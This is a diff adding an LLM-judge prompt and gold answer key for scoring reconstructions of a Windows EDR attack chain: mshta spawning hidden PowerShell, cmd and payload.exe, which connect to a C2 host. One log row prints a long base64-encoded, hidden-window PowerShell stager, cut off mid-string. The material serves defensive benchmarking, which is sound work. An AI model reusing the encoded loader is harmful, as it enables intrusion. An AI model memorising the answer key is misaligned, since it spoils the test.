@@ -1,0 +1,944 @@
+You are a strict evaluator for Windows endpoint behavior-chain reconstruction.
+
+Score CANDIDATE_OUTPUT against GOLD using action-claim metrics.
+
+Core definitions:
+- An action_claim is the smallest behavior assertion where one subject performs one operation against one object.
+- A candidate code_step may contain multiple action_claims. Split it when it contains multiple subjects, operations, objects, command lines, or unrelated behaviors.
+- The candidate's surface output is code_steps/code_sequence. The scoring unit is the action_claim you extract from those outputs.
+- Each action_claim can have at most these scoring slots: subject, operation, object, command_line, critical_evidence.
+- command_line is an attribute of the relevant action_claim. It is not an independent behavior step.
+- critical_evidence is one slot per action_claim. If the candidate lists many evidence rows for the same claim, select the best support and score only one critical_evidence slot. Do not increase the denominator because evidence is verbose.
+
+Primary metrics:
+- behavior_step_recall: step-level recall over GOLD.gold_step_count. A gold step is covered when at least one required item from that step is recovered.
+- action_step_recall: for every non-evidence GOLD.gold_required_items item (subject/operation/object/command_line), score 1 if the candidate reconstructs the same substantive value, otherwise 0.
+- action_step_precision: score gold-aligned correctness on the same dynamic non-evidence required-item denominator as recall. The numerator is the number of unique true-positive candidate subject/operation/object/command_line slots that match gold required items.
+- critical_evidence_recall: score critical_evidence separately. It is not part of the action_step_recall or action_step_precision denominator.
+- candidate_claim_precision is a diagnostic: for every non-null candidate action_claim slot you list, mark it as true positive or false positive against gold. This diagnostic keeps the candidate-side denominator.
+- behavior_sequence_order: score each gold order pair as 1 only when the related action claims are recovered and their relative order is correct.
+
+Extraction and denominator rules:
+- Action recall denominator is the number of non-critical-evidence GOLD.gold_required_items in the GOLD block. In this run it is 21.
+- Main action precision denominator is the same non-critical-evidence required-item count. In this run it is 21.
+- Step-level behavior_step_recall / coarse action-step coverage denominator is GOLD.gold_step_count. In this run it is 7.
+- Behavior order denominator is GOLD.gold_order_pair_count. In this run it is 6.
+- Candidate-side overclaiming is not folded into the main precision denominator. It is reported by candidate_claim_precision and overclaim_slot_count.
+- Do not list null, unknown, not observed, absent, or explicitly uncertain placeholder values as candidate slots.
+- If a candidate says an observed gold value does not exist, or makes a negative claim that contradicts observed evidence, list that negative claim as a false positive slot.
+- If the candidate mixes in a nearby unrelated behavior, split that nearby behavior into its own action_claims and score their slots as false positives unless they match gold.
+- Duplicate true-positive slots may match the same gold item only once for the numerator. Repeated duplicate claims do not increase the main precision denominator; they remain in the candidate_claim_precision denominator and overclaim diagnostics.
+- Do not score precision at the sentence, paragraph, major-claim, or coarse-step level.
+
+Evidence policy:
+- Gold uses critical_evidence, not arbitrary evidence count.
+- Candidate evidence verbosity must not expand recall or precision denominators.
+- CBC alert report_name/reason is evidence only.
+- If GOLD critical_evidence_policy excludes CBC alerts or the gold evaluation unit contains "non_alert", then CBC alert report_name, reason, alert_name, alert_id, and watchlist.hit rows are not valid true-positive critical_evidence.
+- If an alert name such as "Discovery - Query Registry" or "Persistence - Regmod Run or Runonce Key Modification" is emitted as the behavior operation, mark that operation slot as false positive with false_positive_type=alert_name_as_behavior.
+- Fabricated concrete PID, event_id, alert_id, path, command line, process relation, registry path, or timestamp must reduce precision and be listed in hallucinated_claims.
+- A real-but-noncritical extra evidence citation for an otherwise correct action_claim should not create additional denominator slots; unsupported or contradicted evidence should be counted in unsupported_evidence or contradicted_evidence diagnostics.
+
+Scoring style:
+- Give 0 for missing, ambiguous, partially wrong, unrelated-chain, or unsupported values. Do not use 0.5.
+- Return JSON only. All scores must be integer 0 or 1.
+- Use Japanese for reasons and summaries. Preserve raw paths, command lines, alert IDs, source_stream values, and timestamps exactly.
+
+Expected JSON schema:
+{
+  "case_id": "string",
+  "judge_summary_ja": "string",
+  "chains": [
+    {
+      "chain_id": "string",
+      "gold_required_item_scores": [
+        {
+          "item_id": "string",
+          "step_id": "string",
+          "kind": "subject|operation|object|command_line|critical_evidence",
+          "matched_candidate_excerpt": "string|null",
+          "score": "0|1",
+          "reason_ja": "string"
+        }
+      ],
+      "candidate_action_claim_scores": [
+        {
+          "candidate_claim_id": "string",
+          "candidate_step_id": "string|null",
+          "claim_excerpt": "string",
+          "normalized_action_claim_ja": "string",
+          "slot_scores": [
+            {
+              "slot_id": "string",
+              "kind": "subject|operation|object|command_line|critical_evidence",
+              "candidate_slot_excerpt": "string",
+              "matched_gold_item_id": "string|null",
+              "is_true_positive": "0|1",
+              "false_positive_type": "nearby_unrelated|hallucinated_value|alert_name_as_behavior|unsupported_negative|unsupported_inference|unsupported_evidence|contradicted_evidence|duplicate_claim|none",
+              "reason_ja": "string"
+            }
+          ]
+        }
+      ],
+      "order_pairs": [
+        {
+          "before_step_id": "string",
+          "after_step_id": "string",
+          "score": "0|1",
+          "reason_ja": "string"
+        }
+      ]
+    }
+  ],
+  "error_flags": {
+    "target_missing": [
+      "item_id"
+    ],
+    "chain_mixing": "boolean",
+    "hallucinated_claims": [
+      "string"
+    ],
+    "unsupported_evidence": [
+      "string"
+    ],
+    "contradicted_evidence": [
+      "string"
+    ],
+    "nearby_action_false_positives": [
+      "string"
+    ],
+    "weak_grounding": "boolean",
+    "false_positive_claims": [
+      "string"
+    ],
+    "notes_ja": [
+      "string"
+    ]
+  },
+  "candidate_action_claim_count": "integer",
+  "candidate_action_claim_slot_count": "integer",
+  "candidate_action_claim_true_positive_slot_count": "integer",
+  "hallucinated_claim_count": "integer",
+  "unsupported_evidence_count": "integer",
+  "contradicted_evidence_count": "integer",
+  "nearby_action_fp_count": "integer",
+  "main_missing_items": [
+    "string"
+  ],
+  "main_false_positive_claims": [
+    "string"
+  ]
+}
+
+GOLD:
+{
+  "evaluation_unit": "action_claim_required_items",
+  "case_id": null,
+  "gold_step_count": 7,
+  "gold_required_item_count": 28,
+  "gold_action_required_item_count": 21,
+  "gold_order_pair_count": 6,
+  "gold_required_items": [
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S01",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S01:subject",
+      "kind": "subject",
+      "gold_value": "mshta.exe (PID 4724)",
+      "acceptable_terms": [
+        "mshta.exe (PID 4724)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S01",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S01:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S01",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S01:object",
+      "kind": "object",
+      "gold_value": "powershell.exe (PID 2976)",
+      "acceptable_terms": [
+        "powershell.exe (PID 2976)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S01",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S01:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR event row",
+      "acceptable_terms": [
+        "Canonical CBC EDR event row"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S02",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S02:subject",
+      "kind": "subject",
+      "gold_value": "powershell.exe (PID 2976)",
+      "acceptable_terms": [
+        "powershell.exe (PID 2976)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S02",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S02:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S02",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S02:object",
+      "kind": "object",
+      "gold_value": "powershell.exe (PID 3820)",
+      "acceptable_terms": [
+        "powershell.exe (PID 3820)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S02",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S02:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR event row",
+      "acceptable_terms": [
+        "Canonical CBC EDR event row"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S03",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S03:subject",
+      "kind": "subject",
+      "gold_value": "powershell.exe (PID 3820)",
+      "acceptable_terms": [
+        "powershell.exe (PID 3820)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S03",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S03:operation",
+      "kind": "operation",
+      "gold_value": "initiated connection",
+      "acceptable_terms": [
+        "initiated connection"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S03",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S03:object",
+      "kind": "object",
+      "gold_value": "ortrta.net / 10.193.66.115:8443",
+      "acceptable_terms": [
+        "ortrta.net / 10.193.66.115:8443"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S03",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S03:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR event row",
+      "acceptable_terms": [
+        "Canonical CBC EDR event row"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S04",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S04:subject",
+      "kind": "subject",
+      "gold_value": "powershell.exe (PID 3820)",
+      "acceptable_terms": [
+        "powershell.exe (PID 3820)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S04",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S04:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S04",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S04:object",
+      "kind": "object",
+      "gold_value": "cmd.exe (PID 2168)",
+      "acceptable_terms": [
+        "cmd.exe (PID 2168)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S04",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S04:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR event row",
+      "acceptable_terms": [
+        "Canonical CBC EDR event row"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S05",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S05:subject",
+      "kind": "subject",
+      "gold_value": "cmd.exe (PID 2168)",
+      "acceptable_terms": [
+        "cmd.exe (PID 2168)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S05",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S05:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S05",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S05:object",
+      "kind": "object",
+      "gold_value": "payload.exe (PID 4184)",
+      "acceptable_terms": [
+        "payload.exe (PID 4184)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S05",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S05:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR event row",
+      "acceptable_terms": [
+        "Canonical CBC EDR event row"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S06",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S06:subject",
+      "kind": "subject",
+      "gold_value": "payload.exe (PID 4184)",
+      "acceptable_terms": [
+        "payload.exe (PID 4184)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S06",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S06:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S06",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S06:object",
+      "kind": "object",
+      "gold_value": "payload.exe (PID 3652)",
+      "acceptable_terms": [
+        "payload.exe (PID 3652)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S06",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S06:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR event row",
+      "acceptable_terms": [
+        "Canonical CBC EDR event row"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S07",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S07:subject",
+      "kind": "subject",
+      "gold_value": "payload.exe (PID 3652)",
+      "acceptable_terms": [
+        "payload.exe (PID 3652)"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S07",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S07:operation",
+      "kind": "operation",
+      "gold_value": "initiated connection",
+      "acceptable_terms": [
+        "initiated connection"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S07",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S07:object",
+      "kind": "object",
+      "gold_value": "ortrta.net / 10.193.66.115:9999",
+      "acceptable_terms": [
+        "ortrta.net / 10.193.66.115:9999"
+      ]
+    },
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "step_id": "s4_09_ps2976_hidden_parent-S07",
+      "item_id": "s4_pt_04_powershell_c1:s4_09_ps2976_hidden_parent-S07:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR event row",
+      "acceptable_terms": [
+        "Canonical CBC EDR event row"
+      ]
+    }
+  ],
+  "critical_evidence_policy": null,
+  "chains": [
+    {
+      "chain_id": "s4_pt_04_powershell_c1",
+      "chain_title": "S4 process-time C1: PowerShell to payload and C2",
+      "gold_steps": [
+        {
+          "step_id": "s4_09_ps2976_hidden_parent-S01",
+          "order": 1,
+          "subject": "mshta.exe (PID 4724)",
+          "action": "started",
+          "object": "powershell.exe (PID 2976)",
+          "segment": "observed_attack_cluster",
+          "evidence_basis": "Canonical CBC EDR event row",
+          "confidence": "observed",
+          "process_code_object": "powershell.exe (PID 2976)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 3640,
+              "timestamp_utc": "2022-07-20T00:53:44.1585257Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\windows\\system32\\mshta.exe",
+              "process_pid": 4724,
+              "parent_path": "c:\\windows\\system32\\svchost.exe",
+              "parent_pid": 644,
+              "process_cmdline": "C:\\Windows\\System32\\mshta.exe -Embedding",
+              "object_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "childproc_pid": 2976
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=3640 time=2022-07-20T00:53:44.1585257Z action=ACTION_CREATE_PROCESS process=c:\\windows\\system32\\mshta.exe pid=4724 parent_path=c:\\windows\\system32\\svchost.exe parent_pid=644 process_cmdline=C:\\Windows\\System32\\mshta.exe -Embedding object_name=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe childproc_name=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe childproc_pid=2976"
+            ]
+          }
+        },
+        {
+          "step_id": "s4_09_ps2976_hidden_parent-S02",
+          "order": 2,
+          "subject": "powershell.exe (PID 2976)",
+          "action": "started",
+          "object": "powershell.exe (PID 3820)",
+          "segment": "observed_attack_cluster",
+          "evidence_basis": "Canonical CBC EDR event row",
+          "confidence": "observed",
+          "process_code_object": "powershell.exe (PID 3820)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 3793,
+              "timestamp_utc": "2022-07-20T00:53:48.9708009Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "process_pid": 2976,
+              "parent_path": "c:\\windows\\system32\\mshta.exe",
+              "parent_pid": 4724,
+              "process_cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQBVAEwAMQAyAEkAQwBBADcAVgBYAGIAWQAvAGEAUgAnACcAKwAnACcAaABEACcAJwArACcAJwArAFgAcQBuAC8AdwBZAHEAUQBNAEEAbwBIAE4AcgBpAFgAdQAwAGkAUgBhAHMAUAB4AEYAbQB4AGUALwBIAFoAQQBVAFcAWABzAHQAYgAzAEgAMgBrAHYAcwBOAFIAeABwACsAOQA4ADcAQwAvAGoAdQBvAGwAegBhAHQARgBJAHMAVwBhAHgAMwBaADIAWgBuAG4AMwBsAG0AWgB7ADEAfQBtAEwAMQBHAGUAWQBwAHsAMQB9AEkAZQBDAEgALwA4AC8ASgBOAHcAZQBhAFoAZQA1AGkAVwBDAFcAUABHAEwAcwBGADAAWABLAHIAdABzAHUAcAAzAFcAbgBwAGMAcgBPADYAcAAxAGgAQQArAEMAdQBGAEoAMwB1AHkANQBOAFAASgB5AHUAMwA3AC8AdgBGAEYAbQBHAFUAbgBiACsAYgB2AFEAUgBVAC8ATQBjAEoAUgB1AEMAVQBTADcAVwBoAEQAOABGAE4AMABZAFoAdQBwAHAAcwBIAHAARABQAGgARAArAEUAeQB1ACsATgBQAHEARQBiAGoAMQB6AEUAagBoADMAUABqADUARgB3AHAAYQBZAEIAWAB4AHQAVAAzACsATwBlAE4AYwB3AGQAdwBVAHkAcwAvAHYAWgBiAHQAYgBhADYAawB0AGUATgB1ADAAKwBGAFIAMwBLAHgAYQBoACcAJwArACcAJwA1AHoAaABwAEoARwBRAEUAaQAxAEoAdgB4AFYANAB4AHQAYQB4AHgAMABTAHEAegByADIATQA1AHIAVABrAEQAVgBjAG4ATABaACcAJwArACcAJwBiAEQAVAB2AE4AdgBSAEEAWgBZAEcAMgBQAGQATQBSAGkARwB1AFIAVgBPAE0AegB6AGMAVABMAEUAaQBpAHcAOQBuADQAcQBiAE8AUQB1AEoAVgBSAGgATwBNACsAcQByAFEAWgBDAGgAUABLAC8AVwBoAFIAWABmAFkATABWAGUALwB5AHEAdQBMAHIAdgBQAGkANQBUAGgAQgBEAFcARwBLAFUATQBaADMAWgBrAG8AMgAyAE0AZgA1AFkAMgBCAGwAdwBZAEUAegBWAEcANABCAGkAMgBUAFoAVABpAE4AMQByAFUAYQBpAE8AMwBwAEYAbwBtAFYAdABDAEMAawBMAHYAdwBYAE0ANgBLAEIARABpAFYAMgAzADYAcwBrAHYAbABRAEMAcQBTAG4ATABhAG4AVwBJADYAaQB2AG4AMQBHAGwAUQBFAEgAVABXAHIATAA3AGkANgBJAGsASgBOAFgAaQBlADIAQQBBAEkALwBzAFYAQgBEAEUAcwBHAEgAWgBlAHQAVgB5AGoAMABQAEYARQArAHEAOQBNAEsAQQBwAC8ARgBLAGMAMwB4AFMAZgBlAEQASQBOAFUARgBIAFgAYgAzAEcATQAyAE8AOABGAG0AeABzAHsAMQB9AEwAVgAxAGsAKwBJAEMANQBWAEEAQwB0AFAANgA5ADEAcQBUAFMAMQBXAHUAVwBBAFEAdwBzADMASQBvAEQAdABiAFAAKwBsADgAUQBvAEIASgB3AHAAWAA4AHsAMQB9AGMAeABlAEYATwBFAFgAZABZACsAbwBsADIAQwAvADUASwByADQAVwBFAHgAUQBTAGQATQBLAGoAVQBZAG8AWgA0AEoANQBZAHYAUwB5AHsAMQB9AG8ASQBzAEkAaQBqAHoARwBVAGUAYgBVACsARQByAHQATABzAEgAcwBTAFYAYwByAE0AQQBsAFEAcAB2AG8AUQAxAHgAeQA4AHsAMQB9AHAARABYAHYAbgBUAG0ASABEAGkAeAAnACcAKwAnACcATwBrAHgAMQBsAEEAJwAnACsAJwAnAEIAMgA1ADIALwB7ADEAfQBhAGkAVwBFAEwARQBHAGwAOQBDAFUAegBqAHUAWAB1AC8AQgB1AEUAcQBoADMAaQA1AFgAbABkAG0AQgBhAFEAcABuADUAZABNAEoARgBIAFUARgBBAFgAMQBEAFQASABsAHkAVwAxAFkAUABRADAAcgBEADYANwBxAHgAZQBFAFkAZAAvAEwAVwBXAGwAdQBYAGYAcwBDAHoATQB1AG0ASABaAHIAbQBMAEMAdAA4AGkAQwBrAEEAWQBKAGsANwA1AEcATwBQAGMARAB6AHEAdwB7ADEAfQBBAEgAUwBEAHUAYQBPAEMAbwAzAHIANwA2AEsAUgBzAGMAagBCAEgASQBIAEwATwAwAGgARwBqAEQARABVAFQAQQBaAFoAMABvAEcAZgBwADUAWQBVAFcAdQBZAGkAQQAyAFQASABVAEUASgB5AEoAeQBLAFIAbwA5ADQARQBaAFMASQBTADQAYQBjAHEATwBWAEYASwBLAGkAKwA2AG0AYQBaAEIAbQBmAE8AYwAxAFIASwBPAEYANAA0AEMAYQBFADIAQwAnACcAKwAnACcAVwBWADEAdwBjAEUAWgB7ADEAfQB3AEwARQBFAFEAWgBtAC8AUwA4AFgAdgBxADQAOAA0AEUAcwBuAFEANQBlADQAaQBHAFYAcQByAGIAUQBqADQAKwBTAHYASABNAEwAZgBIAHoAaABCAEwALwBpAGMAMABNAHsAMQB9AFkASQBOAEgATABhAEsASgA1AE8AYgBwAFcAegBqAFYARwBmAE4ATwBjADQASwBrAEsAegAyAEsAWQBFAGoAJwAnACsAJwAnADAAWQBiAGIARQA4AFAATQBDAHIAdwAyAHQAMwAzAHcAVQBmAFIANQBRAGQAUAAzAFkASABUAGQAMwB2ADUATgBOACsANwAwAGIARgBoACsAagB7ADEAfQAzAHgAaQBxAEgANAB3AEMAZABHACcAJwArACcAJwB1AEMAMwAnACcAKwAnACcATQB4AFIAVwBHAGUAcQBEAG0AWgBZADAAcABUAFkAMQB5AFEATAB4AHYAYQBRAEwAWQBiAHEAdwBNAEoAUwB0AEkAaAA5AEkAawAzAEIAaAByAG4ASQBKAFgAdwBZAHUATAByAGYAMQBUADQAZgBXAGoAbgBRAFYARgBFAEcAOQA1AEwAYQBiAGkAdQBUAHQAcgBRAEYAOABCAFoAWQBqAHIAWgBxAFkAQwBUADQAOABEAGkARwBNAFIAVABUAHkAVgB7ADEAfQBiADUAcABvADAASgBIAGUAagB6AG4AegBqAHQAJwAnACsAJwAnAG4AcABMAGwAdwB5AGEAUwBpADgATwBYAFoAcQBiADEANAB0AHUAcwA5AG0AOABEAGIAegArAEwAeQBSAFEATgBSAHEAMABTAE8ARQA1AGMAMgBvAE4ALwBFAFIAcgBOAGgAMAA5AFkASgBZACcAJwArACcAJwB0AEcANQBiADkATgB2ADcATQAnACcAKwAnACcAegAyAG0ANQB0ADkAZQBlACsANQB7ADEAfQB2AHoAQgB0ADUALwBLAEIARwBIADMAdgBCAGIAcABQAE0AOQAwAEYAYgBqAHkAdwB5AGkAMwBSAEwATABmAFIAdQBIAGoAbAB7ADEAfQB4ADMAaQBZAHYAUgBzAE8AbwBwAGIAUgAyAFUAYQB6AGUAKwAyAHcANgBUAHYAMwBTADMAYwAwADkAdQA1AG4AZQA4AFAAUwAyACsATQBIAHYAVABYAHMAeABHAE8AegBOAHoAZQBzAHoAaQBIAGEAOQBFAG0AMgBOAEwAWABCADAAagBXAHkAegBSAEYAMABXAHYARgB4ADAANQBMAEoAKwBQAE4AJwAnACsAJwAnAFcAewAxAH0AYgAwAEsAbwArAHYATABrADQANgBpADYASwBaAG0ATABkAHgAbAA3AEMAZgBiAEoAegB0AHEAUAA3AHAAMgAwAGkAUgB0ADMAagBxAFcAMwBhAEoAZAA4AEoAbQArAFAAWQBMAEQARQAzAHoARAAvAFIANgAzAFkAMgBPADUAbABSAFMAegBxADgAbQBMADEAbwAyADgAYQBNADkAegAvAGMARwBZAGIAZQB6AGwAWQB0AEUATwBaAHIANABwAE8ANQBQAGUAYQBMAHUAeABSAHAAYgA5ADAAQgB0AGIALwBlAFgARQAnACcAKwAnACcAZABPAFAASABoAGUAdQByAGQAagArACsAeAA4AHQAbQB2ADMAbgByAGoAaAA2AEoAUQBkAFgAdQBtAE0AWQA5AHcARQBRAE8ATABDAGQANQB5AEIAeABUAGUAUQBkAHIAcgBoAGYAdABRAG0AKwBvAEEAawA2AGQAawBkAEsAbgBkADMAYQBmAGgAawA0AFMAeQAvAFAAZABkAGYALwBrAEYAKwBEAG8ASgBCAEgAVAA0AHAAagBMADkAdwA0AEQAMgAvAGEARwBrAGEAVQBDADcAdgBPAHAASwBpAHYAVABwAG0ATwAxADcANAAzAHIATwB4ADgAOAAxAGoANwBOACsAcABGADYAQgB5AE0AUAAzAHAAbQBxAFcAVgA0AFAAYgArADIAMwA5ADAAMQA1AEMAWABzAHIAYQBlAHEAMABJAG4AVQBJAGEANwBhADgAcABIAGMANwBiADYAVABzACcAJwArACcAJwBtAHcANwBuAHoAMgBjAGwASAA2AGoAKwBCAE8AegBmAEUAMQBjADMAdwB1AHYAKwBuAHMAZAA0ADcANgBmAH